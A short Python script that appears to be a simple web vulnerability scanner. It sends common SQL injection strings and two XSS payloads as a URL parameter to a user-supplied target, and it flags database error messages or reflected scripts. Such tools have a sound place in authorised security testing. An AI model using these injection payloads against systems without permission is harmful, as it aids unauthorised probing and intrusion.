import requests
import re
import threading

url = input(str("Enter the Target URL : "))

payload = {
    "SQLi": ["'","' OR '1'='1","\"","\" OR \"1\"=\"1", "'; --", "' UNION SELECT 1,2,3 --"],
    "XSS" : ["<script>alert('XSS')</script>","'><img src=x onerror=alert('XSS')>"]
}

sqli_errors = [
    "SQL syntax","SQLite3::query():", "MySQL server", "syntax error", "Unclosed quotation mark", "near 'SELECT'",
    "Unknown column", "Warning: mysql_fetch", "Fatal error"
]

def Vuln_Scanner(type, payload):
    response = requests.get(url, params={"id": payload})
    content = response.text.lower()

    if type == 'SQLi' and any(error.lower() in content for error in sqli_errors):
        print(f"[+] Potential **SQLi** Vulnerablity Detected : {payload}")

    elif type == 'XSS' and payload.lower() in content:
        print(f"[+] Potential XSS Vulnerablity Detected : {payload}")

thread = []
for vuln, tests in payload.items():
    for payload in tests:
        t = threading.Thread(target=Vuln_Scanner,args=(vuln,payload))
        thread.append(t)
        t.start()
    
for t in thread:
    t.join()
